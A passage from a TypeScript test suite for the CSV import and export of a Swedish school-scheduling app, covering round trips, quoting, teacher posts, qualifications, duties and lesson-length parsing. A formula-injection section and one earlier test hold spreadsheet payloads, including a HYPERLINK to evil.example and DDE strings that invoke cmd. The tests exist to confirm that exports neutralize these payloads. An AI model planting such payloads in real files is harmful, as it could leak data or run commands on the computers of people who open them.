          "grupp;amne;lektioner_per_vecka;minuter_per_lektion;minutesBefore;minutesAfter;" +
          "larare;medlarare;veckor;fran;till;larare_procent;medlarare_procent\r\n",
      );
    });

    it("quotes a group name containing the delimiter so it imports back whole", () => {
      const csv = requirementsToCsv(
        [requirement({ studentGroupId: "g-semi" })],
        [...groups, { id: "g-semi", name: "7A; parallell" }],
        subjects,
        people,
      );

      expect(csv).toContain('"7A; parallell"');
      expect(mapRequirementRows(parseCsv(csv)).rows[0]?.groupName).toBe(
        "7A; parallell",
      );
    });

    it("neutralizes a group name that a spreadsheet would run as a formula", () => {
      const csv = requirementsToCsv(
        [requirement({ studentGroupId: "g-formula" })],
        [...groups, { id: "g-formula", name: '=HYPERLINK("http://evil.example/")' }],
        subjects,
        people,
      );

      // The apostrophe is what marks the cell as text; import strips it again,
      // so the name survives the round trip unchanged.
      expect(dataLines(csv)[0]?.replace(/^"/, "").startsWith("'")).toBe(true);
      expect(mapRequirementRows(parseCsv(csv)).rows[0]?.groupName).toBe(
        '=HYPERLINK("http://evil.example/")',
      );
    });
  });
});

describe("serializeCsv", () => {
  it("leaves ordinary fields unquoted", () => {
    expect(serializeCsv(["a", "b"], [["1", "2"]])).toBe("\uFEFFa;b\r\n1;2\r\n");
  });

  it("quotes only the fields that need it", () => {
    const csv = serializeCsv(["a", "b"], [["plain", "has;delimiter"]]);

    expect(csv).toContain('plain;"has;delimiter"');
  });

  it("doubles embedded quotes, as RFC 4180 requires", () => {
    expect(serializeCsv(["a"], [['say "hi"']])).toContain('"say ""hi"""');
  });

  it("quotes a field containing a newline so the row stays one row", () => {
    const csv = serializeCsv(["a"], [["two\nlines"]]);

    expect(csv).toContain('"two\nlines"');
  });
});

describe("export round trips", () => {
  it("room types survive a trip out and back", () => {
    const exported = roomTypesToCsv([{ name: "Textilslöjd" }, { name: "Aula" }]);
    const { rows, errors } = mapRoomTypeRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows).toEqual([{ name: "Textilslöjd" }, { name: "Aula" }]);
  });

  it("classes survive, keeping the grade level a number again", () => {
    const exported = classesToCsv([
      { name: "7A", kind: "CLASS", gradeLevel: 7 },
      { name: "F-klass", kind: "CLASS", gradeLevel: 0 },
    ]);
    const { rows, errors } = mapClassRows(parseCsv(exported));

    expect(errors).toEqual([]);
    // Year 0 must survive as 0, not be lost to a falsy check somewhere.
    expect(rows).toEqual([
      { name: "7A", gradeLevel: 7 },
      { name: "F-klass", gradeLevel: 0 },
    ]);
  });

  it("leaves a class without a grade level blank, and reads back without one", () => {
    const exported = classesToCsv([{ name: "Förberedelse", kind: "CLASS", gradeLevel: null }]);
    const { rows, errors } = mapClassRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows[0]).toEqual({ name: "Förberedelse" });
  });

  it("keeps teaching groups out of the class export", () => {
    // They have their own file; re-importing them here would turn every
    // teaching group into a home class.
    const exported = classesToCsv([
      { name: "7A", kind: "CLASS", gradeLevel: 7 },
      { name: "Ma71", kind: "TEACHING_GROUP", gradeLevel: null },
    ]);

    expect(mapClassRows(parseCsv(exported)).rows).toEqual([
      { name: "7A", gradeLevel: 7 },
    ]);
  });

  it("teachers survive, and students are left out of their file", () => {
    const exported = teachersToCsv([
      { role: "TEACHER", firstName: "Karin", lastName: "Ek", email: "karin@s.se" },
      { role: "STUDENT", firstName: "Alma", lastName: "Berg", email: "alma@s.se" },
    ]);
    const { rows, errors } = mapTeacherRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      { firstName: "Karin", lastName: "Ek", email: "karin@s.se" },
    ]);
  });

  it("students survive with their class written as a name", () => {
    const exported = studentsToCsv(
      [
        {
          role: "STUDENT",
          firstName: "Alma",
          lastName: "Berg",
          email: "alma@s.se",
          studentGroupId: "g-7a",
        },
      ],
      (id) => (id === "g-7a" ? "7A" : ""),
    );
    const { rows, errors } = mapStudentRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      { firstName: "Alma", lastName: "Berg", email: "alma@s.se", className: "7A" },
    ]);
  });

  it("writes a blank class for a student who has none, not a placeholder", () => {
    // An em dash or "—" would come back as a class name the importer cannot
    // resolve, turning every classless student into a row error.
    const exported = studentsToCsv(
      [
        {
          role: "STUDENT",
          firstName: "Alma",
          lastName: "Berg",
          email: "alma@s.se",
          studentGroupId: null,
        },
      ],
      () => "",
    );

    expect(exported.trimEnd().split("\r\n").at(-1)).toBe("Alma;Berg;alma@s.se;");
  });

  it("memberships survive as one row per membership", () => {
    const exported = membershipsToCsv(
      [
        { id: "g-ma71", name: "Ma71" },
        { id: "g-en74", name: "En74" },
      ],
      [
        { id: "st-1", email: "alma@s.se" },
        { id: "st-2", email: "nils@s.se" },
      ],
      [
        { studentGroupId: "g-ma71", studentId: "st-1" },
        { studentGroupId: "g-ma71", studentId: "st-2" },
        { studentGroupId: "g-en74", studentId: "st-1" },
      ],
    );
    const { rows, errors } = mapMembershipRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      { groupName: "Ma71", email: "alma@s.se" },
      { groupName: "Ma71", email: "nils@s.se" },
      { groupName: "En74", email: "alma@s.se" },
    ]);
  });

  it("skips a membership it cannot name rather than exporting a blank cell", () => {
    // A blank group name is a row the importer rejects — writing it would
    // produce a file that cannot be uploaded back.
    const exported = membershipsToCsv(
      [{ id: "g-ma71", name: "Ma71" }],
      [{ id: "st-1", email: "alma@s.se" }],
      [
        { studentGroupId: "g-ma71", studentId: "st-1" },
        { studentGroupId: "g-gone", studentId: "st-1" },
        { studentGroupId: "g-ma71", studentId: "st-gone" },
      ],
    );

    expect(mapMembershipRows(parseCsv(exported)).rows).toEqual([
      { groupName: "Ma71", email: "alma@s.se" },
    ]);
  });

  it("teaching requirements survive, subject as code, teachers as e-mail", () => {
    const exported = requirementsToCsv(
      [
        {
          studentGroupId: "g-7a",
          subjectId: "s-ma",
          teacherId: "t-karin",
          coTeacherId: null,
          lessonsPerWeek: 3,
          minutesPerLesson: 60,
          minutesBefore: 0,
          minutesAfter: 0,
          teacherLoadPercent: 100,
          coTeacherLoadPercent: 100,
          recurrence: "ALL_WEEKS",
          startDate: null,
          endDate: null,
        },
        {
          studentGroupId: "g-sl",
          subjectId: "s-sl",
          teacherId: "t-karin",
          coTeacherId: "t-bo",
          lessonsPerWeek: 1,
          minutesPerLesson: 120,
          minutesBefore: 0,
          minutesAfter: 0,
          teacherLoadPercent: 100,
          coTeacherLoadPercent: 100,
          recurrence: "ODD_WEEKS",
          startDate: "2026-01-12",
          endDate: "2026-03-27",
        },
      ],
      [
        { id: "g-7a", name: "7A" },
        { id: "g-sl", name: "Sl71" },
      ],
      [
        { id: "s-ma", name: "Matematik", code: "MA" },
        { id: "s-sl", name: "Textilslöjd", code: null },
      ],
      [
        { id: "t-karin", email: "karin@s.se" },
        { id: "t-bo", email: "bo@s.se" },
      ],
    );
    const { rows, errors } = mapRequirementRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      {
        groupName: "7A",
        subject: "MA",
        lessonsPerWeek: 3,
        minutesPerLesson: 60,
        minutesBefore: 0,
        minutesAfter: 0,
        teacherEmail: "karin@s.se",
        coTeacherEmail: null,
        teacherLoadPercent: 100,
        coTeacherLoadPercent: 100,
        recurrence: "ALL_WEEKS",
        startDate: null,
        endDate: null,
      },
      {
        // No code on Textilslöjd, so the name is what the file carries — and
        // what the importer resolves.
        groupName: "Sl71",
        subject: "Textilslöjd",
        lessonsPerWeek: 1,
        minutesPerLesson: 120,
        minutesBefore: 0,
        minutesAfter: 0,
        teacherEmail: "karin@s.se",
        coTeacherEmail: "bo@s.se",
        teacherLoadPercent: 100,
        coTeacherLoadPercent: 100,
        recurrence: "ODD_WEEKS",
        startDate: "2026-01-12",
        endDate: "2026-03-27",
      },
    ]);
  });

  it("carries the pupils' ombyte and dusch out and back unchanged", () => {
    /*
     * The round trip the two columns exist for: export, edit in Excel, upload
     * again. Both numbers have to survive as numbers — a 10 written as a string
     * and read back as a 10 is the whole contract — and the pair must not swap
     * places, which is what a test with one non-zero number could not see.
     *
     * 0 and 60 are the ends of the requirement's own range, so the row also
     * says that neither end is lost on the way through a spreadsheet.
     */
    const exported = requirementsToCsv(
      [
        {
          studentGroupId: "g-7a",
          subjectId: "s-idh",
          teacherId: null,
          coTeacherId: null,
          lessonsPerWeek: 2,
          minutesPerLesson: 60,
          minutesBefore: 10,
          minutesAfter: 20,
          teacherLoadPercent: 100,
          coTeacherLoadPercent: 100,
          recurrence: "ALL_WEEKS",
          startDate: null,
          endDate: null,
        },
        {
          studentGroupId: "g-7a",
          subjectId: "s-ma",
          teacherId: null,
          coTeacherId: null,
          lessonsPerWeek: 3,
          minutesPerLesson: 60,
          minutesBefore: 0,
          minutesAfter: 60,
          teacherLoadPercent: 100,
          coTeacherLoadPercent: 100,
          recurrence: "ALL_WEEKS",
          startDate: null,
          endDate: null,
        },
      ],
      [{ id: "g-7a", name: "7A" }],
      [
        { id: "s-idh", name: "Idrott och hälsa", code: "IDH" },
        { id: "s-ma", name: "Matematik", code: "MA" },
      ],
      [],
    );
    const { rows, errors } = mapRequirementRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows.map((row) => [row.subject, row.minutesBefore, row.minutesAfter])).toEqual([
      ["IDH", 10, 20],
      ["MA", 0, 60],
    ]);
  });

  it("writes a header-only file when there is nothing to export", () => {
    const exported = roomTypesToCsv([]);

    expect(exported).toBe("\uFEFFnamn\r\n");
    expect(mapRoomTypeRows(parseCsv(exported)).rows).toEqual([]);
  });

  it("quotes a name containing the delimiter in every kind", () => {
    const exported = classesToCsv([
      { name: "7A; parallell", kind: "CLASS", gradeLevel: 7 },
    ]);

    expect(mapClassRows(parseCsv(exported)).rows[0]?.name).toBe("7A; parallell");
  });
});


describe("formula injection", () => {
  // The data is not typed by us: a school's roster arrives by CSV from a
  // municipal system, and SchemaPro stores whatever a name field contains. The
  // payload does nothing here — it runs when an administrator opens the export.
  const attacks = [
    ["=HYPERLINK(\"http://evil.example/\"&A1,\"klicka\")", "equals"],
    ["+1+1", "plus"],
    ["-2+3+cmd|' /C calc'!A0", "minus"],
    ["@SUM(1+1)*cmd|' /C calc'!A0", "at"],
    ["\t=1+1", "leading tab"],
    ["   =1+1", "leading spaces"],
  ] as const;

  it.each(attacks)("neutralizes %s (%s)", (payload) => {
    const csv = serializeCsv(["name"], [[payload]]);
    const cell = csv.split("\r\n")[1]!;

    // Quoting alone is not a defence — a spreadsheet evaluates a quoted field
    // too. The apostrophe is what marks the cell as text.
    expect(cell.replace(/^"/, "").startsWith("'")).toBe(true);
  });

  it("survives export → import → export unchanged", () => {
    // A guard that corrupted the round-trip would be its own bug: these files
    // are re-imported, and a name must come back as the name.
    const original = "=HYPERLINK(\"http://x/\")";
    const parsed = parseCsv(serializeCsv(["name"], [[original]]));

    expect(parsed.rows[0]?.[0]).toBe(original);
    expect(serializeCsv(["name"], [[parsed.rows[0]![0]!]])).toBe(
      serializeCsv(["name"], [[original]]),
    );
  });

  it("leaves a negative number a number", () => {
    // Guarding -5 would turn a figure that sums into text that does not.
    expect(serializeCsv(["n"], [["-5"]])).toContain("-5");
    expect(serializeCsv(["n"], [["-5"]])).not.toContain("'-5");
  });

  it("leaves an ordinary name alone", () => {
    expect(serializeCsv(["name"], [["Öberg"]])).toContain("Öberg");
    expect(serializeCsv(["name"], [["Öberg"]])).not.toContain("'Öberg");
  });

  it("does not strip an apostrophe that belongs to the value", () => {
    const parsed = parseCsv(serializeCsv(["name"], [["'Anna'"]]));
    expect(parsed.rows[0]?.[0]).toBe("'Anna'");
  });
});

// ---------------------------------------------------------------------------
// Tjänstefördelning: the post columns on the teachers file, and behörigheter
// ---------------------------------------------------------------------------

describe("mapTeacherRows: the optional post", () => {
  const file = (rows: string) =>
    parseCsv(`fornamn;efternamn;epost;tjanst_procent;nedsattning_procent;avtal;signatur\n${rows}`);

  it("reads a decimal comma, an enum word in any case, and leaves blanks out", () => {
    const { rows, errors } = mapTeacherRows(
      file("Karin;Ek;k@s.se;66,667;;Semestertjänst;\nBo;Alm;b@s.se;80;20;FERIE;BAL"),
    );
    expect(errors).toEqual([]);
    expect(rows).toStrictEqual([
      { firstName: "Karin", lastName: "Ek", email: "k@s.se", employmentPercent: 66.667, contractKind: "SEMESTER" },
      {
        firstName: "Bo",
        lastName: "Alm",
        email: "b@s.se",
        employmentPercent: 80,
        reductionPercent: 20,
        contractKind: "FERIE",
        signature: "BAL",
      },
    ]);
  });

  it("refuses the DTO's bounds with the row named, one error per row", () => {
    const { rows, errors } = mapTeacherRows(
      file(
        [
          "A;A;a@s.se;0;;;",
          "B;B;b@s.se;100.5;;;",
          "C;C;c@s.se;80;90;;",
          "D;D;d@s.se;80;;vikarie;",
          "E;E;e@s.se;80;;;ANDERSSON",
          "F;F;f@s.se;;;ferie;",
          "G;G;g@s.se;80;;;",
        ].join("\n"),
      ),
    );
    expect(rows.map((row) => row.firstName)).toEqual(["G"]);
    expect(errors.map((error) => error.row)).toEqual([1, 2, 3, 4, 5, 6]);
    expect(errors[2]?.message).toContain("nedsättningen (90 %) är större än tjänsten (80 %)");
    expect(errors[3]?.message).toContain('avtal "vikarie"');
    expect(errors[5]?.message).toContain("utan tjanst_procent");
  });

  it("still takes a three-column staff list exactly as before", () => {
    const { rows, errors } = mapTeacherRows(parseCsv("fornamn;efternamn;epost\nKarin;Ek;k@s.se"));
    expect(errors).toEqual([]);
    expect(rows).toStrictEqual([{ firstName: "Karin", lastName: "Ek", email: "k@s.se" }]);
  });
});

describe("mapTeacherQualificationRows", () => {
  const file = (rows: string) =>
    parseCsv(`larare_epost;amne;fran_arskurs;till_arskurs;behorighet\n${rows}`);

  it("refuses a reversed span, an unknown kind and a grade off the scale", () => {
    const { rows, errors } = mapTeacherQualificationRows(
      file("k@s.se;MA;9;7;legitimation\nk@s.se;NO;7;9;vikarie\nk@s.se;SV;7;13;behörig\nk@s.se;EN;1;9;Legitimerad"),
    );
    expect(rows).toEqual([
      { teacherEmail: "k@s.se", subject: "EN", minGrade: 1, maxGrade: 9, kind: "LEGITIMATION" },
    ]);
    expect(errors.map((error) => error.row)).toEqual([1, 2, 3]);
    expect(errors[0]?.message).toContain("7–9, inte 9–7");
    expect(errors[1]?.message).toContain('behorighet "vikarie"');
    expect(errors[2]?.message).toContain('till_arskurs "13"');
  });

  it("catches two rows for one teacher and subject, whichever case the file uses", () => {
    const { rows, errors } = mapTeacherQualificationRows(
      file("k@s.se;MA;1;6;behörig\nK@S.SE;ma;7;9;behörig"),
    );
    expect(rows).toHaveLength(1);
    expect(errors).toEqual([
      { row: 2, message: expect.stringContaining("står redan på rad 1") },
    ]);
  });

  it("names the missing columns", () => {
    const { errors } = mapTeacherQualificationRows(parseCsv("larare_epost;amne\nk@s.se;MA"));
    expect(errors[0]?.message).toBe(
      "Kolumner saknas: fran_arskurs, till_arskurs, behorighet. Ladda ner mallen och utgå från den.",
    );
  });
});

describe("staffing export round trips", () => {
  it("teachers carry their post back in, and a teacher without one stays a plain row", () => {
    const exported = teachersToCsv(
      [
        { id: "t-1", role: "TEACHER", firstName: "Karin", lastName: "Ek", email: "k@s.se" },
        { id: "t-2", role: "TEACHER", firstName: "Bo", lastName: "Alm", email: "b@s.se" },
      ],
      (userId) =>
        userId === "t-1"
          ? { employmentPercent: 66.667, reductionPercent: 0, contractKind: "SEMESTER", signature: "KEK" }
          : undefined,
    );
    const { rows, errors } = mapTeacherRows(parseCsv(exported));
    expect(errors).toEqual([]);
    expect(rows).toStrictEqual([
      { firstName: "Karin", lastName: "Ek", email: "k@s.se", employmentPercent: 66.667, contractKind: "SEMESTER", signature: "KEK" },
      { firstName: "Bo", lastName: "Alm", email: "b@s.se" },
    ]);
  });

  it("behörigheter survive, subject as code, kind as a word, unknown references dropped", () => {
    const exported = teacherQualificationsToCsv(
      [
        { userId: "t-1", subjectId: "s-ma", minGradeLevel: 7, maxGradeLevel: 9, kind: "LEGITIMATION" },
        { userId: "t-1", subjectId: "s-no", minGradeLevel: 4, maxGradeLevel: 6, kind: "TILLATEN" },
        { userId: "t-gone", subjectId: "s-ma", minGradeLevel: 1, maxGradeLevel: 3, kind: "BEHORIG" },
      ],
      [{ id: "t-1", email: "k@s.se" }],
      [
        { id: "s-ma", name: "Matematik", code: "MA" },
        { id: "s-no", name: "Naturorientering", code: null },
      ],
    );
    const { rows, errors } = mapTeacherQualificationRows(parseCsv(exported));
    expect(errors).toEqual([]);
    expect(rows).toEqual([
      { teacherEmail: "k@s.se", subject: "MA", minGrade: 7, maxGrade: 9, kind: "LEGITIMATION" },
      { teacherEmail: "k@s.se", subject: "Naturorientering", minGrade: 4, maxGrade: 6, kind: "TILLATEN" },
    ]);
  });
});

describe("mapTeacherDutyRows", () => {
  it("reads a four-column file and reports only those columns, so nothing optional is cleared", () => {
    const { rows, errors, columns } = mapTeacherDutyRows(
      parseCsv("Lärare e-post;Typ;Benämning;Minuter per vecka\nk@s.se;Mentor;Mentor 7B;90"),
    );
    expect(errors).toEqual([]);
    expect(rows).toStrictEqual([
      { teacherEmail: "k@s.se", kind: "MENTORSKAP", label: "Mentor 7B", minutesPerWeek: 90 },
    ]);
    expect(columns).toEqual(["teacherEmail", "kind", "label", "minutesPerWeek"]);
  });

  it("reads the typ as a word, with or without diacritics, and refuses one it does not know", () => {
    const words = [
      ["förstelärare", "FORSTELARARE"],
      ["Pedagogisk lunch", "PEDAGOGISK_LUNCH"],
      ["APT/konferens", "APT_KONFERENS"],
      ["VFU-handledning", "VFU_HANDLEDNING"],
      ["RASTVAKT", "RASTVAKT"],
    ];
    for (const [word, kind] of words) {
      const { rows } = mapTeacherDutyRows(
        parseCsv(`larare_epost;typ;benamning;minuter_per_vecka\nk@s.se;${word};X;30`),
      );
      expect(rows[0]?.kind).toBe(kind);
    }
    const { errors } = mapTeacherDutyRows(
      parseCsv("larare_epost;typ;benamning;minuter_per_vecka\nk@s.se;städning;X;30"),
    );
    expect(errors[0]?.message).toContain('typ "städning" känns inte igen');
  });

  it("holds the DTO's bounds and refuses a duplicate identity, naming the first row", () => {
    const { rows, errors } = mapTeacherDutyRows(
      parseCsv(
        [
          "larare_epost;typ;benamning;minuter_per_vecka;raknas_som_undervisning",
          "k@s.se;apt;APT;0;",
          "k@s.se;apt;APT;2401;",
          "k@s.se;apt;APT;120;kanske",
          "k@s.se;apt;APT;120;ja",
          "K@S.SE;apt;apt;60;",
        ].join("\n"),
      ),
    );
    expect(errors.map((error) => error.row)).toEqual([1, 2, 3, 5]);
    expect(errors[0]?.message).toContain("mellan 1 och 2400");
    expect(errors[2]?.message).toContain("varken ja eller nej");
    expect(errors[3]?.message).toContain("rad 4");
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ countsAsTeaching: true, minutesPerWeek: 120 });
  });

  it("names the missing required columns", () => {
    const { errors } = mapTeacherDutyRows(parseCsv("larare_epost;typ\nk@s.se;apt"));
    expect(errors).toEqual([
      { row: 0, message: expect.stringContaining("benamning, minuter_per_vecka") },
    ]);
  });
});

// ---------------------------------------------------------------------------
// Lektionslängder in the timplan file
// ---------------------------------------------------------------------------

describe("lektionslangder in the timplan file", () => {
  const HEAD = "grupp;amne;lektioner_per_vecka;minuter_per_lektion;lektionslangder\r\n";
  const file = (...rows: string[]) => HEAD + rows.join("\r\n") + "\r\n";

  it("reads the cell's grammar in every spelling the column documents", () => {
    expect(parseLengthSpec("1x80+1x40")).toEqual([80, 40]);
    expect(parseLengthSpec("1 × 80 + 1 × 40")).toEqual([80, 40]);
    expect(parseLengthSpec("2*60+1X55")).toEqual([60, 60, 55]);
    expect(parseLengthSpec("80+40")).toEqual([80, 40]);
    expect(parseLengthSpec("80, 40")).toBeNull();
    expect(parseLengthSpec("1x")).toBeNull();
    expect(parseLengthSpec("1x40.5")).toBeNull();
    expect(parseLengthSpec("0x80")).toBeNull();
  });

  it("writes a split post longest first, in the grammar it reads back", () => {
    expect(formatLengthSpec({ lessonsPerWeek: 3, minutesPerLesson: 60, lessonLengths: [60, 55, 60] })).toBe(
      "2x60+1x55",
    );
    expect(parseLengthSpec("2x60+1x55")).toEqual([60, 60, 55]);
  });

  it("imports a file without the column exactly as before: no key, no column", () => {
    const { rows, errors, columns } = mapRequirementRows(
      parseCsv("grupp;amne;lektioner_per_vecka;minuter_per_lektion\r\n7A;MA;3;60\r\n"),
    );
    expect(errors).toEqual([]);
    expect(rows[0]).not.toHaveProperty("lessonLengths");
    expect(columns).not.toContain("lessonLengths");
  });

  it("takes a filled cell as the row, deriving the two numbers it leaves empty", () => {
    const { rows, errors, columns } = mapRequirementRows(parseCsv(file("7A;IDH;;;1x80+1x40")));
    expect(errors).toEqual([]);
    expect(rows[0]).toMatchObject({ lessonsPerWeek: 2, minutesPerLesson: 80, lessonLengths: [80, 40] });
    expect(columns).toContain("lessonLengths");
  });

  it("accepts the numbers written beside the cell when they agree with it", () => {
    const { rows, errors } = mapRequirementRows(parseCsv(file("7A;IDH;2;80;1x40+1x80")));
    expect(errors).toEqual([]);
    expect(rows[0]).toMatchObject({ lessonsPerWeek: 2, minutesPerLesson: 80, lessonLengths: [80, 40] });
  });

  it("sends an empty cell, and a cell of one length, as [] — a uniform post", () => {
    const { rows, errors } = mapRequirementRows(parseCsv(file("7A;MA;3;60;", "7A;SV;;;3x60")));
    expect(errors).toEqual([]);
    expect(rows[0]).toMatchObject({ lessonsPerWeek: 3, minutesPerLesson: 60, lessonLengths: [] });
    expect(rows[1]).toMatchObject({ lessonsPerWeek: 3, minutesPerLesson: 60, lessonLengths: [] });
  });

  it("still asks for the two numbers when the cell is empty", () => {
    const { errors } = mapRequirementRows(parseCsv(file("7A;MA;;;")));
    expect(errors).toEqual([{ row: 1, message: expect.stringContaining("lektioner_per_vecka") }]);
  });

  it("refuses a row whose numbers contradict its cell, naming both", () => {
    const { rows, errors } = mapRequirementRows(parseCsv(file("7A;IDH;3;60;1x80+1x40")));
    expect(rows).toEqual([]);
    expect(errors).toEqual([
      {
        row: 1,
        message: expect.stringMatching(
          /^Rad 1: lektionslangder är 2 lektioner med längsta 80 minuter, men raden säger 3 × 60\./,
        ),
      },
    ]);
  });

  it("refuses a cell the database would refuse, one row error each", () => {
    const { rows, errors } = mapRequirementRows(
      parseCsv(file("7A;A;;;1x80+1x42", "7A;B;;;1x80+1x250", "7A;C;;;80+60+40+20", "7A;D;;;tre", "7A;E;;;30x60+11x40")),
    );
    expect(rows).toEqual([]);
    expect(errors.map((error) => error.row)).toEqual([1, 2, 3, 4, 5]);
    expect(errors[0].message).toContain("jämnt upp i 5 minuter");
    expect(errors[1].message).toContain("mellan 15 och 240");
    expect(errors[2].message).toContain("högst 3 olika");
    expect(errors[3].message).toContain("går inte att läsa");
    expect(errors[4].message).toContain("fler än 40");
  });

  it("calls a readable cell with too many or no lessons what it is, not unreadable", () => {
    // The grammar is right; the count is the problem. "41x15" is the cap, as
    // "30x60+11x40" already says, and "0x60" is a part with no lesson.
    const { rows, errors } = mapRequirementRows(
      parseCsv(file("7A;A;;;41x15", "7A;B;;;45x40", "7A;C;;;0x60+1x40", "7A;D;;;999999999x60")),
    );
    expect(rows).toEqual([]);
    expect(errors.map((error) => error.row)).toEqual([1, 2, 3, 4]);
    expect(errors[0].message).toContain("fler än 40");
    expect(errors[1].message).toContain("fler än 40");
    expect(errors[2].message).toContain("minst en lektion");
    expect(errors[3].message).toContain("fler än 40");
    for (const error of errors) expect(error.message).not.toContain("går inte att läsa");
  });

  describe("export", () => {
    const groups = [{ id: "g-7a", name: "7A" }];
    const subjects = [
      { id: "s-ma", name: "Matematik", code: "MA" },
      { id: "s-idh", name: "Idrott", code: "IDH" },
    ];
    const requirement = (over: Partial<Parameters<typeof requirementsToCsv>[0][0]> = {}) => ({
      studentGroupId: "g-7a",
      subjectId: "s-ma",
      teacherId: null,
      coTeacherId: null,
      lessonsPerWeek: 3,
      minutesPerLesson: 60,
      minutesBefore: 0,
      minutesAfter: 0,
      teacherLoadPercent: 100,
      coTeacherLoadPercent: 100,
      recurrence: "ALL_WEEKS" as const,
      startDate: null,
      endDate: null,
      ...over,
    });

    it("writes the file it always wrote when no post is split, empty lists included", () => {
      const before = requirementsToCsv([requirement()], groups, subjects, []);
      const withEmpty = requirementsToCsv([requirement({ lessonLengths: [] })], groups, subjects, []);
      expect(withEmpty).toBe(before);
      expect(before.split("\r\n")[0]).toBe(BOM + CSV_TEMPLATES.requirements.headers.join(";"));
    });

    it("adds the column, last, when some post is split, and leaves it empty on the uniform ones", () => {
      const csv = requirementsToCsv(
        [requirement(), requirement({ subjectId: "s-idh", lessonsPerWeek: 2, minutesPerLesson: 80, lessonLengths: [80, 40] })],
        groups,
        subjects,
        [],
      );
      const lines = csv.trimEnd().split("\r\n");
      expect(lines[0].endsWith(";larare_procent;medlarare_procent;lektionslangder")).toBe(true);
      expect(lines.slice(1)).toEqual([
        "7A;MA;3;60;0;0;;;alla;;;100;100;",
        "7A;IDH;2;80;0;0;;;alla;;;100;100;1x80+1x40",
      ]);
    });

    it("round-trips a split post through its own file", () => {
      const csv = requirementsToCsv(
        [requirement({ subjectId: "s-idh", lessonsPerWeek: 3, minutesPerLesson: 60, lessonLengths: [60, 60, 55] })],
        groups,
        subjects,
        [],
      );
      const { rows, errors } = mapRequirementRows(parseCsv(csv));
      expect(errors).toEqual([]);
      expect(rows[0]).toMatchObject({ lessonsPerWeek: 3, minutesPerLesson: 60, lessonLengths: [60, 60, 55] });
    });
  });
});
